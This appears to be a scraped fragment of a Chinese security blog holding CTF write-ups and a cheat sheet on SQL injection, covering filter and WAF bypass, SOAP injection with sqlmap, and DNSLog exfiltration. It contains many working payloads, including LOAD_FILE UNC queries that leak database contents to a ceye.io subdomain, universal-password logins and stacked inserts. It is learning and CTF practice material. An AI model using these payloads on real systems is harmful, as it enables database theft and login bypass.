&apos;0:0:5&apos;","categories":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://ggyggy666.github.io/categories/SQL%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"不同数据库的注入方法(Access、SQLServer)","slug":"不同数据库的注入方法-Access、SQLServer","permalink":"https://ggyggy666.github.io/tags/%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95-Access%E3%80%81SQLServer/"}],"keywords":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://ggyggy666.github.io/categories/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"从SQL注入题目收获的小知识","slug":"从SQL注入题目收获的小知识","date":"2020-03-31T08:16:36.000Z","updated":"2020-04-01T00:22:30.087Z","comments":true,"path":"2020/03/31/从SQL注入题目收获的小知识/","link":"","permalink":"https://ggyggy666.github.io/2020/03/31/%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E9%A2%98%E7%9B%AE%E6%94%B6%E8%8E%B7%E7%9A%84%E5%B0%8F%E7%9F%A5%E8%AF%86/","excerpt":"","text":"过滤了某些字符题目地址：https://www.mozhe.cn/bug/detail/a1diUUZsa3ByMkgrZnpjcWZOYVEyUT09bW96aGUmozhe 进入环境，首先在?id=1后加一个单引号，回显为空了。使用–+或者#或%23都无法正常回显，然后使用or ‘1’=’1的确是正常回显了，但发现URL并不是?id=1’ or ‘1’=’1 , 而是还且?id=1.说明并不是正常的字符型注入。很可能其实是数字型注入（因为#那些不得行），然后检测到了or ‘1’=’1非法输入就跳转到了首页才导致看到的是正常回显页面。 确定了是数字型，尝试?id=1 and 1=1还是跳转到了首页。说明id=1后面的都有可能被过滤了。and、空格、=都有可能。尝试使用/**/代替空格，?id=1/**/and/**/1=2, 还是跳到了首页，将and用&amp;&amp;代替，?id=1/**/&amp;&amp;/**/1=2，虽然没跳转，但还是正常回显。其实&amp;&amp;这里是不行的，应该使用%26%26代替，?id=1/**/%26%261=2，终于没有回显，1=1后就正常回显了。等号是没问题的。 尝试爆字段，?id=1/**/order/**/by/**/1, 跳转到首页了。order by被过滤了。直接使用union，还是被过滤了。报错注入，1/**/%26%26extractvalue(1,concat(0x7e,(select/**/database()),0x7e))一样不行。没有办法。 最终使用编码，用到burp的Decoder，hackbar的无法编码字母。这里就算编码了也不能用报错注入。使用联合查询，将 -1/**/union/**/select/**/1,2,3,4进行URL编码后，终于页面回显出来2和3。之后就正常的注入了，这是不可能的。当使用正常爆表语句（编码后）时竟然还是跳转了。其实是等号造成的。而我们第一步认为等号是没问题的，所以说这里特别注意!使用like代替=。 id=1//union//select//1,group_concat(table_name),3,4//from//information_schema.tables//where//table_schema//like/**/database() 这样就正常了。这题主要是收获：当单引号使它不能正常回显时，就非常可能是有注入的。后面判断是字符型还是数字型时正常方法不能判断时，就考虑过滤了什么，and、空格、等号这些。关键字被过滤时考虑编码。 绕安全狗绕过方法来自先知：https://xz.aliyun.com/t/7449 https://xz.aliyun.com/t/7430 题目地址：http://www.zhanluanjie.win:10021/ 这题的安全狗主要是检测到union select、database()、version()等还有information_schema.xxx就拦截。 union select之间的空格使用：/*!/*/**/*/ 代替。 database()应该换成：database%0a()。 将information_schema.xxx的后面的隔离where的那个空格替换成：/*!/*/**/*/。这道题就可绕过了。 其它的绕过比如and 1=1 换成：%26%26True, and 1=2 换成：%26%26False。更多详情可见上面那两篇文章。 使用burp进行时间盲注题目地址：https://www.mozhe.cn/bug/detail/ZEZ4REhOck9KMnVKMjFLTitQWFg5dz09bW96aGUmozhe 网上说的都是布尔盲注，然后根据爆破的长度来区分哪个是正确的。这道题是时间盲注，而且回显的长度都是一样的，因此需要些小技巧区分（本人花了挺久时间才弄出来的）这题也是有点奇怪，它加了单引号回显的才是正常的。因此需要在引号里面输入payload。即: ?type=1 xxxx’ 。 抓包发送到intrude，使用cluste bomb，在爆的第i个字符位置与ascii等于哪个值那里加$（如下）.可以选择sleep(10),然后payload选择number，第一个payload那里可以填1-4-1，延时10秒恰好可以爆破四位。第二次就是5-8了…第二个payload那里就可以填a-z的ASCII。慢慢调。在点attack后，点那个request让它不要排序，最后出现的四位就是爆破出来的正确的。（慢慢调试试4位，3位…）因为有些时候不能根据回响长度来判断是哪个正确的。 爆表名and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),§1§,1))=§1§,sleep(10),1)那个limit 1,1表示第二张表，limit 0,1表示第一张，可以修改。 看图片的加$的位置。 第一个payload设置成1-4-1，这是本题延时10秒内能够爆破分辨出的最大的个数。第二个payload就可以是正常的字母的ASCII码范围。点击爆破后，先点击request让它不要排列。然后爆破完后查看最后的四位（有可能只有三位或两位或一位…需要慢慢调payload1或者sleep()的秒数）：比如这里，显然只有1，2,4正常，因为3跟上面的都是124，显然不是（之前爆是可以的…）。因此需要再调，调成1-5-1后，sleep（15），如下： 还是没有3…3就独立爆吧… 爆列名and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=(table_name) limit 0,1),§1§,1))=§1§,sleep(10),1)同理。","categories":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://ggyggy666.github.io/categories/SQL%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"从SQL注入题目收获的小知识","slug":"从SQL注入题目收获的小知识","permalink":"https://ggyggy666.github.io/tags/%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E9%A2%98%E7%9B%AE%E6%94%B6%E8%8E%B7%E7%9A%84%E5%B0%8F%E7%9F%A5%E8%AF%86/"}],"keywords":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://ggyggy666.github.io/categories/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"SOAP注入","slug":"SOAP注入","date":"2020-03-27T08:15:18.000Z","updated":"2020-04-18T11:07:23.395Z","comments":true,"path":"2020/03/27/SOAP注入/","link":"","permalink":"https://ggyggy666.github.io/2020/03/27/SOAP%E6%B3%A8%E5%85%A5/","excerpt":"经过昨晚以及今天下午的研究，我终于学会了如何挖SOAP注入并且成功拿到flag。太不容易了！","text":"经过昨晚以及今天下午的研究，我终于学会了如何挖SOAP注入并且成功拿到flag。太不容易了！ 网上关于这种注入的方式的文章讲解真的太少了！而且讲得不是太清楚（或许是我太菜了），导致我昨晚研究了一晚都没有什么收获。迫不得已去公众号直接搜，没想到有一篇文章讲的不错，让我瞬间明白怎么利用了。链接在这 SOAP协议SOAP是WebService的三要素之一，关于WebService在我之前的文章有讲到：链接SOAP（Simple Object Access Protocol)，简单对象访问协议，是一个可以在不同操作系统上运行的不同语言编写的应用程序之间进行传输通信的协议。它基于HTTP协议传输，传输文本格式是XML。 组成它包括四个部分： 封装：定义了一个框架，描述了消息中的内容是什么，谁应当处理它，它是可选的还是必须的。 编码规则：定义了一种序列化机制，用于交换应用程序定义的数据类型的实例。 RPC表示：定义用于表示远程过程调用和应答的协定。 SOAP绑定：约定使用底层传输协议来完成节点间交换SOAP封装。 文档消息结构 Envelope: 将该XML文档标识为一条SOAP消息。 Header：包含头部信息。 Body：包含所有调用和响应信息。 Fault：提供处理所发生的错误的信息。 格式如下： &lt;?xml version=&quot;1.0&quot;?&gt; &lt;soap:Envelope xmlns:soap=&quot;http://xxx/soap-envelope&quot; soap:encodingStyle=&quot;http://xxx/soap-encoding&quot;&gt; &lt;soap:Header&gt; &lt;/soap:Header&gt; &lt;soap:Body&gt; &lt;soap:Fault&gt; &lt;/soap:Fault&gt; &lt;/soap:Body&gt; &lt;/soap:Envelope&gt;必须使用XML编码，Envelope、Encoding命名空间，不能包含DTD（外部实体）引用，不包含XML处理指令。 一道CTF题目链接：http://www.whalwl.top:8018打开后初始化，点击进入到一个XML文档页面，可以看到URL链接是：http://www.whalwl.top:8018/ws_soap.php?wsdl有?wsdl，可以判定是SOAP类型的，可能存在漏洞。抓包发现没有传递什么参数，在burp里挖是不太可能了（反正我不懂）。根据网上的教程，直接把这个链接丢到AWVS13里面去爬、探测。 AWVS操作步骤打开https://localhost:3443, 点击Targets-&gt;Add Target-&gt;填入要爬的URL并随便填写备注-&gt;Save-&gt;默认配置，直接点Scan-&gt;开始扫描。最后扫出来的结果可以在Vulnerabilities里查看。 实战操作可以看到出现了SQL注入，还是盲注类型。点击该漏洞，右边出现了该漏洞的详细信息，往下拉到HTTP Request。 点左上角的复制，将整个请求包复制下来，在桌面新建一个txt文件，命名为soap.txt。打开，粘贴，在title那里加一个*（加*是让sqlmap探测这个位置）,保存。打开SQLmap，开始注入。 需要解释一下这个请求包后面的xml格式的内容： &lt;?xml version=&quot;1.0&quot;?&gt; &lt;soap:Envelope xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt; &lt;soap:Header /&gt; &lt;soap:Body&gt; &lt;tns:get_tickets_stock&gt; &lt;title&gt;*&lt;/title&gt; &lt;/tns:get_tickets_stock&gt; &lt;/soap:Body&gt; &lt;/soap:Envelope&gt;有Envelope,Header,Body，没有Fault。为什么这个请求包会这样呢，还需要打开 http://www.whalwl.top:8018/ws_soap.php?wsdl 分析里面的xml文本内容。 首先在这个文档里面找到xsd:string类型的那个标签，发现它在一个name为title里面，那么说明这里就是注入的地方，因此请求包那才在中间加*。 然后找到这个titlt所在的标签，是message，name为：get_tickets_stockRequest 。 通过这个name找到调用这个message的地方，发现它在一个input标签中。 发现它在一个operation标签里，并且这个标签的name为：get_tickets_stock 。因此得到整个流程：在body里面，首先通过tns:get_tickets_stock找到operation标签，运行标签里的输入框input，就开始调用message，通过message=”tns:get_tickets_stockRequest”找到对应的message标签，最后运行到title那个标签。 &lt;tns:get_tickets_stock&gt; &lt;title&gt;*&lt;/title&gt; &lt;/tns:get_tickets_stock&gt;请求包中的这两句就是这么来的。 爆数据库名python sqlmap.py -r F:\\\\360MoveData\\\\Users\\\\ASUS\\\\Desktop\\\\soap.txt --batch --dbs使用-r参数读取文件内容进行操作，后面跟的是soap.txt所在的绝对路径，–batch是在遇到选择时默认选yes，–dbs就是爆数据库名。 爆出来了数据库名，我们要的flag在whalwl这个数据库名中。 爆数据库表名python sqlmap.py -r F:\\\\360MoveData\\\\Users\\\\ASUS\\\\Desktop\\\\soap.txt --batch --tables -D &quot;whalwl&quot; 爆数据库列名python sqlmap.py -r F:\\\\360MoveData\\\\Users\\\\ASUS\\\\Desktop\\\\soap.txt --batch --columns -D &quot;whalwl&quot; -T &quot;this_flag&quot; 爆flag内容python sqlmap.py -r F:\\\\360MoveData\\\\Users\\\\ASUS\\\\Desktop\\\\soap.txt --batch --dump -D &quot;whalwl&quot; -T &quot;this_flag&quot; -C &quot;flag&quot; 成功拿到flag了！不容易啊。需要注意的是，这种方式使用了AWVS扫描+sqlmap盲注，发包频繁，小心使用，别把人家网站整挂了…","categories":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://ggyggy666.github.io/categories/SQL%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"SOAP注入","slug":"SOAP注入","permalink":"https://ggyggy666.github.io/tags/SOAP%E6%B3%A8%E5%85%A5/"}],"keywords":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://ggyggy666.github.io/categories/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"DNSLog型SQL注入","slug":"DNSLog型SQL注入","date":"2020-03-26T08:55:58.000Z","updated":"2020-04-15T05:02:11.513Z","comments":true,"path":"2020/03/26/DNSLog型SQL注入/","link":"","permalink":"https://ggyggy666.github.io/2020/03/26/DNSLog%E5%9E%8BSQL%E6%B3%A8%E5%85%A5/","excerpt":"遇到了一道DNSLog注入的CTF题，之前都不知道原来还能这么玩，又涨知识了。","text":"遇到了一道DNSLog注入的CTF题，之前都不知道原来还能这么玩，又涨知识了。 当页面没有回显，只能使用布尔盲注或者时间盲注时，不得不利用脚本去一个个请求尝试，这样会发送大量请求包，可能导致IP被禁。因此需要利用dnslog注入。(需要文件权限） 查看是否拥有文件权限在自己的mysql上，输入：show variables like &#39;%secure%&#39;;可以看到secure_file_priv的值是一个目录，代表只可以读取这个目录下的文件。如果是NULL，代表无法读取任意文件,这个时候需要修改my.ini配置，在mysqld部分增加：secure_file_priv=’D:\\phpstudy_pro\\WWW’,就可以读取这个目录下的文件了。网上说，如果是：secure_file_priv=’’可以读取任意文件，但我试过了会出错不得行。这个时候需要变成：secure_file_priv= 直接不用引号，然后再查看： 发送DNS查询有了文件权限就可以使用Load_file了（MySQL下）.这里得提到ceye.io网站。它可以提供给注册者一个域名，如果使用这个域名进行查询或者请求都会收到记录。上面也讲有SQL注入、命令执行等漏洞的payload利用。 SELECT LOAD_FILE(CONCAT(&apos;\\\\\\\\&apos;,(SELECT hex(user())),&apos;.2iw1pn.ceye.io\\\\abc&apos;));UNC路径解释一下payload是怎么构造出来的。这就需要涉及到UNC路径的知识了。UNC是网络（主要是局域网）资源的完整Windows 2000名称，只适用于Windows。通过UNC路径就能访问到网络上的共享文件夹资源。它的格式如下： \\\\主机名（或域名或ip）\\共享资源名称由于这个是访问主机名下的共享文件目录，肯定得先找到该主机名或者域名对应的ip地址，因此需要向DNS服务器发起一个解析请求。不难联想到，当我们查询数据库时，拼接上我们的域名，再以这种UNC路径的格式查询，那就会将查询到的数据与域名一起作为一个子域名然后发起解析请求，给域名所在的网站（ceye.io）收到了这个解析请求后保存了下来就能被我们看到，从而查询出数据。 查询后会需要等待一段时间，直至出现： 需要注意，不知道为什么在命令行这里必须需要使用hex编码后才能发送查询成功，在实际场景可以试试不用hex编码。查看ceye.io的DNS查询记录： 可以看到已经成功记录了查询的user的十六进制（即第一个.之前的数字）。使用hackbar的hex解码后： 成功查询到user。 一道CTF题目地址是：http://www.zhanluanjie.win:10020/time.php?id=1这道题就是可以用布尔或者时间盲注，但如果用脚本的话访问太频繁会出错。因此使用DNSLog注入。 查看是否拥有文件权限and(select count(*) from mysql.user)&gt;0返回正确则拥有，错误则没有。 爆数据库and load_file(concat(&apos;\\\\\\\\&apos;,(select database()),&apos;.2iw1pn.ceye.io\\\\abc&apos;));可以看到上面使用的是and, 使用select 或者 and select不行，还是看具体情况决定使用哪个吧。这里也不用hex。（发送请求之后都会转一段时间，正常现象）。 爆出来的数据库名是：dnslog 爆表名and load_file(concat(&apos;\\\\\\\\&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;dnslog&apos;),&apos;.2iw1pn.ceye.io\\\\abc&apos;)); 爆列名and load_file(concat(&apos;\\\\\\\\&apos;,(select group_concat(column_name) from information_schema.columns where table_name=&apos;flag_is_here&apos;),&apos;.2iw1pn.ceye.io\\\\abc&apos;)); 爆字段and load_file(concat(&apos;\\\\\\\\&apos;,(select group_concat(flag) from flag_is_here),&apos;.2iw1pn.ceye.io\\\\abc&apos;)); flag就爆出来了。只需要加：flag{…}即可。 参考：https://www.cnblogs.com/zhaijiahui/p/9160913.html#autoid-4-2-11","categories":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://ggyggy666.github.io/categories/SQL%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"DNSLog型SQL注入","slug":"DNSLog型SQL注入","permalink":"https://ggyggy666.github.io/tags/DNSLog%E5%9E%8BSQL%E6%B3%A8%E5%85%A5/"}],"keywords":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://ggyggy666.github.io/categories/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"SQL注入总结","slug":"SQL注入总结","date":"2020-03-22T11:47:03.000Z","updated":"2020-09-09T13:40:50.875Z","comments":true,"path":"2020/03/22/SQL注入总结/","link":"","permalink":"https://ggyggy666.github.io/2020/03/22/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/","excerpt":"今天来总结一下SQL注入。","text":"今天来总结一下SQL注入。 原理SQL注入，就是在一个跟数据库交互的地方，用户可以输入某条恶意语句去破坏原来的数据库查询结构并且让数据库将这条恶意语句当作正常的SQL查询语句来执行，进而输出攻击者想要看到的信息。 判断是否存在SQL注入先加个单引号 没报错（完全没反应）。 尝试使用”, ‘), ‘)), “), “))。 可能被过滤了，尝试使用URL编码或其它编码。 可能被转义了，尝试使用%df来吃掉\\（GET型）。如果是POST型，需要先把%df转换成utf-16类型的，再复制到输入框。 使用and 1=1 和 and 1=2 判断是否返回不同的页面，有时候是or 1=1和or 1=2才可以。或者将id-1看是否返回正确界面。 也可能是不将报错信息输出。那么需要使用时间盲注：?id=1&#39; and if((1=2),0,sleep(5))--+。当然，这个时间盲注同样需要判断是’还是”等，还需要判断是否–+被过滤了等。字符型的话不推荐这种判断方法。 可能是在user-agent,cookie,referrer,X-Forwarded-For（记录了ip）中。注意，X-Forwarded-For可能需要自己抓包然后增加上去，比如http请求头中增加一行：X-Forwarded-For: ‘ 。cookie的话可能需要用户登录后才有，比如cookie中含有用户名，如果用户名是被加密了的，必须得把’等也转成那种加密的密文才行。也有可能是cookie一个单独的文件，就是：http://xxx.com/cookie。 也可能是Ajax类型的。就是发起请求时，会先经过Ajax然后才发送到服务器。就是说注入点不在当前URL中，需要抓包，查看GET头的URL，如果跟当前的URL不一样，那就是使用了Ajax，可以尝试在那个URL上注入。 报错了（与正常页面不一样）。 直接报错出：”You have an error….”。 虽然也报错了，但是发现有”&#39; LIMIT 0,1”，即把’用\\转义，同样尝试%df，或者编码。不行的话，很可能就是数字型的。 报错之后，使用?id=1’ or ‘1’=’1，发现还是那个报错页面，那么就很可能是数字型的。 如果没过滤什么and,if等关键字的话，数字型的可以直接用时间盲注判断：and if((1=2),0,sleep(5))。如果在判断数字型时，使用and 1=1 和 and 1=2返回的还是正常页面，无论怎么判断都是正常页面时，可以使用时间盲注判断！ 一些需要注意的点 Burp中，如果遇到输入了：or &#39;1&#39;=&#39;1等有空格的payload后报错400什么的，那么需要将空格使用+代替！ 使用order by爆字段数时，不需要将前面的id=1变成id=-1，在使用union时才需要。如果要爆字段，id=1&#39; order by 7 or &#39;1&#39;=&#39;1是不行的。会始终返回正常页面判断不了。只能用#等注释方法。如果–+，#这种被过滤了，就无法爆字段，只能用union select 1,‘2…慢慢试。 要学会根据功能猜测数据库的查询语句。 比如重置密码，就是相当于更新操作：update table xxx set xxx=&#39;xx&#39;，那么显然就是应该使用单引号或者双引号，当然也可能会是加一个括号，’)或”)。 如果是输入的东西被呈现在页面，那么可能是插入操作。insert into 表名 values (&#39;xx&#39;,&#39;xx&#39;)。这就得知道字段数了，如果是在user-agent或cookie或referer中，那么可以使用报错注入：‘) and extractvalue xxx –+。将前面的闭合，后面的注释，看起来可以，但我自己测却不行。最好还是使用：‘ and extractvalue xxx or ‘1’=’1。 如果是**POST型的 **，只会提示登录正确或者错误时，可以尝试使用堆叠注入，大胆猜测表名叫user, 然后：admin&#39;;insert into user value(&#39;test&#39;,&#39;password&#39;)#往user表中插入用户名和密码，然后尝试使用test和password进行登录。输入框也可以用时间盲注：admin&#39;and If(ascii(substr(database(),1,1))=115,1,sleep(5))# 如果是tomcat的apache服务，出现了index.jsp?id=1, 可以这样构造：index.jsp?id=1&amp;id=-2&#39; union xxxx 如果过滤了关键字，可以尝试sel/**/ect。 如果是根据页面回显的不同来判断，那么一定需要id后面有数字：?id=1&#39; and length(database())=8--+ 如果只是?id=’ and…，很可能返回的都是错误的页面。 常见的函数 version() ——MySQL版本 user() ——数据库用户名 database() ——数据库名 @@datadir ——数据库路径 @@version_compile_os ——操作系统版本 判断是什么类型的数据库MSSQL: ‘a’+’b’=’ab’MYSQL: ‘a’’b’=’ab’Oracle: ‘a’||’b’=’ab’ 注入方法union联合注入爆字段数?id=1&#39; order by 3 --+可以使用二分查询增加速度。如果设字段数为7，那么从1-7都是正确的，只有到8及之后时才会出错。也可以使用：limit 1,1 into @ – limit 1,1 into @,@ 使用union查看哪一个字段会输出?id=-1&#39; union select 1,2,3...--+输出了哪几个数字，那个位置就是可以注入的。 爆数据库名 ?id=-1’ union select 1,2,group_concat(schema_name)from information_schema.schemata–+ 注意使用group_concat，不用的话可能只会爆出一个数据库名，后面的表和列也是。 爆表名 ?id=-1’ union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=’xxx’–+ 如果单引号被过滤了，可以使用table_schema=database()。 爆列名 ?id=-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’xxx’–+ 爆字段内容?id=-1&#39; union select 1,2,group_concat(username,&quot;||&quot;,password)from 表名.列名--+ 猜表中的字段数 ?id=1’ and (select count(column_name) from information_schema.columns where table_name=’表名’)=1# 可以搭配limit 0,1使用。 内联注入?id=-1 /*!union*/ /*select*/ 1,2,3 布尔型盲注当输入的查询语句不能输出想要的内容时，可以尝试报错注入。题目：http://59.63.200.79:8003/?id=1 判断数据库长度?id=1&#39; and length(database())=8--+ 判断数据库名使用left函数?id=1&#39; and left(database(),1)&gt;&#39;s&#39;从左开始截取数据库的前1位，那个1可以改成2等，当然也可以用right函数。 使用ascii与substr?id=1&#39; and ascii(substr((select database()),1,1))=115--+里面的select database()也可以替换成select table_name from information_schema xxx 判断表名长度and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)&gt;3如果limit 0,1不行，可以先爆第一个表名后，再使用 and table_name not in(‘xxx’) 判断表名and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() ),1,1))&gt;0 and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() and table_name not in(&apos; 第一个表名&apos;)),1,1))&gt;0判断列名长度and (select length(column_name) from information_schema.columns where table_name=&apos;admin&apos; limit 0,1)&gt;3不知为何，该题只能用limit 0,1,该题判断不了password。 判断列名and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&apos;admin&apos;),1,1))&gt;0 and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&apos;admin&apos; and column_name not in(&apos;第一个列名&apos;)),1,1))&gt;0判断字段内容长度and (select length(username) from admin limit 0,1)&gt;3爆字段内容and ascii(substr((select group_concat(username) from admin),1,1))&gt;0使用ord与mid(爆字段） ?id=1’ and ord(mid((select ifnull(cast(username as char),0x20) from 数据库名.表名 order by id LIMIT 0,1),1,1))&gt;98–+ ord相当于ascii,mid相当于substr。里面查询的内容也可以跟用ascii那样。 使用正则匹配用户名?id=1 and 1=(if((user() regexp &#39;^r&#39;),0,sleep(3)) 匹配表名 ?id=1 and 1=(select 1 from information_schema.tables where table_schema=’数据库名’ and table_name regexp ‘^us%’ limit 0,1) limit作用在select，而不是regexp。也可以用like匹配。 基于报错的注入floor函数 ?id=1’ union select 1,count(),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)2))as a from information_schema.columns group by a–+; union select count(),2,concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()2))as a from information_schema.tables group by a 可以简化成： ?id=1’ union select count() from information_schema.tables group by concat(version(),floor(rand(0)2))–+ 如果关键的表被禁用了，可以： ?id=1’ union select count() from (select 1 union select null union select !1) group by concat(version(),floor(rand(0)2))–+ 如果rand被禁用了，可以： ?id=1’ union select min(@:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)–+ exp函数?id=1 and exp(~(select * from(select user())a))exp是以e为底的对数函数。超出范围报错。 bigint超出范围?id=1 and !(select * from(select user())x) - ~0后面那个是减号。~0是对0逐位取反。 缓冲区溢出 (id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAA)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 ,27,28,29,30,31,32,33,34,35,36–+ 其中0xAAAAAAAAAAAAAAAAAAAAA 这里A越多越好。 xpath语法错误很可能使用and会错，需要换成or或者||。 extractvalue函数?id=1 and extractvalue(1,concat(0x7e,(select @@version),0x7e)) updatexml函数?id=1 and updatexml(1,concat(0x7e,(select @@version),0x7e))需要注意的是：这种方式爆出来的错误只会显示最大长度32位，如果要显示后面的内容，需要使用mid（substr也行）函数。如： ?id=1 and extractvalue(1,concat(0x7e,mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),32),0x7e)) || extractvalue(1,concat(0x7e,mid((select group_concat(column_name) from information_schema.columns where table_name=’flag’),1),0x7e)) || extractvalue(1,concat(0x7e,mid((select group_concat(flag) from flag),1),0x7e))现在是从第32位开始显示，没用mid之前就是从第一位到第32位，用了上述语句，就是从32位后开始的32位，即33-64。那个数字是可以随便修改的。 如果是宽字节注入，单引号被过滤了，后面查询的table_name=’xxx’就用不了了，需要另外一种方法： and%20extractvalue(1,concat(0x7e,mid((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=(table_name)),1),0x7e)) 注意：table_name=((table_name))就是这样子的，不用把里面的换成具体的表名。听说也可以换成十六进制表示。 geometrycollection函数?id=1 and geometrycollection((select * from(select * from(select user())a)b))可以把geometrycollection直接换成其它函数：multipoint,polygon,multipolygon,linestring,multilinestring。 mysql重复特性?id=1 union select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x 使用一个不存在的函数?id=-1&#39; union select a() --+使用了一个不存在的函数a()，然后报错：FUNCTION kzf.a does not exist。就得到了数据库名kzf。 时间盲注?id=1 and if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))?id=1 and select sleep(find_in_set(mid(@@version,1,1),&#39;0,1,2,3,4,5,6,7,8,9&#39;)) 时间盲注可以使用burp进行爆破。使用cluste bomb，在爆的第i个字符位置与ascii等于哪个值那里加$（如下）.可以选择sleep(10),然后payload选择number，第一个payload那里可以填1-4-1，延时10秒恰好可以爆破四位。第二次就是5-8了…第二个payload那里就可以填a-z的ASCII。慢慢调。在点attack后，点那个request让它不要排序，最后出现的四位就是爆破出来的正确的。（慢慢调试试4位，3位…）因为有些时候不能根据回响长度来判断是哪个正确的。 爆表名and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),§1§,1))=§1§,sleep(10),1)那个limit 1,1表示第二张表，limit 0,1表示第一张，可以修改。 爆列名and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=(table_name) limit 0,1),§1§,1))=§1§,sleep(10),1)BENCHMARK函数 ?id=1 and select if(substring(current,1,1)=char(119),BENCHMARK(50000,ENCODE(‘MSG’,’by 5 seconds’)),null) from (select database() as current) as tb1 dnslog注入当页面没有回显时，只能使用布尔盲注或者时间盲注时，不得不利用脚本去一个个请求尝试，这样会发送大量请求包，可能导致IP被禁。因此需要利用dnslog注入。(需要文件权限）LOAD_FILE(CONCAT(&#39;\\\\\\\\&#39;,(SELECT database()),&#39;.ncj58o.ceye.io\\\\abc&#39;));使用ceye.io，进行dns查询或者http请求，就会有记录。具体看：http://ggy.816ym.com/2020/03/26/DNSLog%E5%9E%8BSQL%E6%B3%A8%E5%85%A5/ 文件导出导入判断有无权限and (select count(*) from mysql.user)&gt;0返回正常，有权限。?id=-1 union select 1,2,load_file(&quot;C:xxx&quot;)?id=1 and select version into outfile &quot;路径&quot; 万能密码登录admin&#39; or &#39;1=&#39;1 或 admin&#39; or 1=1 #ASP类型的万能密码：&#39; or&#39;=&#39;or&#39;PHP类型的万能密码：&#39; or 1=1/* 注册时空格超出限制长度假设用户名最大长度支持25个，那么可以：注册一个账号：admin(后面跟25个空格）x ，因为有个x在，那么就不会出现用户名重复。而最大长度是25，因此实际插入（注册）的是：admin（后面加20个空格），登录时就可以使用admin登录了。 order by后的注入?sort=right(version(),1)?sort=1 and rand(sql语句) rand(true)和rand(false)结果不一样。里面的sql语句可以用布尔型盲注。?sort=1 and (select count(*) xxx)可以使用常见的注入语句。 select username,flag,password from users where username=’admin’ union select 1,’a’,3 order by 2 无列名盲注只知道表名，可以用Union给未知的列名“重命名”然后报错。 (select &apos;admin&apos;,&apos;admin&apos;)&gt;(select * from users limit 1)堆叠注入就是加个;，然后加SQL语句。 使用handler代替select查询只限于MySQL，一条一条的读取一个表中的数据。例如： ?id=1;handler users open as u;handler u read first;handler u read next;…handler u close; 首先载入表users，重命名为u，然后读取表中的第一行数据，再读下一行…最后关闭。 HTTP头 Accept: 接收什么类型。 Accept-Encoding: 申明接收的编码。 Connection: 一般为close，告诉服务器，完成本次请求链接后关闭连接。 Content-Length: 响应的长度。 Host：想访问的目标地址。 Referer: 告诉服务器自己是从哪来的。 Server：表明自己是什么软件及版本信息。 User-Agent：表明自己是什么浏览器。 Cookie：浏览器保存的用来验证身份的一段数据。 Latin1默认编码在登录框中，输入admin,被检测到了之后就报错，那么可以：?id=admin%c2 。%c2—%ef之间都可以。 绕过方法过滤了select使用预编译：SET @SQL=0x73656c6563742064617461626173652829;PREPARE pord FROM @SQL;EXECUTE pord;。 过滤了#，–+，%23?id=-1&#39; union select 1,2,&#39;3也可以换成：;%00 // 二次注入 注册一个admin’#的用户名，登录后修改密码。 注册一个test’的用户名，URL中访问: xxx.php?username=test’,返回一个id=22,然后直接再次访问：xxx.php?id=22。就有可能返回MySQL错误。然后访问：xxx.php?id=test’ union select 1,user(),’2,得到新的id与user（）结果。 登录框反斜杠转义原本的查询语句是： select * from users where name=’.$username.’ and pass = ‘.$password.’;在admin中输入,password中输入or 1=1#。\\就将’转义了。变成了： select * from users where name=’and pass=’ or 1=1#’ 过滤了and和or 大小写：Or,And； 编码：hex,urlencode; 添加注释：/or/； 符号替换：and=&amp;&amp;, or=||。也可以试试&amp;,|。 拼接等号：?id=1=(语句)。 换成^号：?id=1^(语句)。过滤了空格 %09 水平TAB键； %0a 新建一行； %0c 新的一页； %0d return功能； %0b 垂直TAB键； %a0 空格； /|-|/ /@-|/ /?-|/ /|%20-%20|/ /**/ . 空格可以换成括号来嵌套：union(select(1,2,3))。 and/or前面可以不用空格，后面可以跟多个!,或者来代替。也可以联合起来，如：select * from user where username=’admin’union(select+title,content//from/!article/where//id=’1’and!!!!1=1) 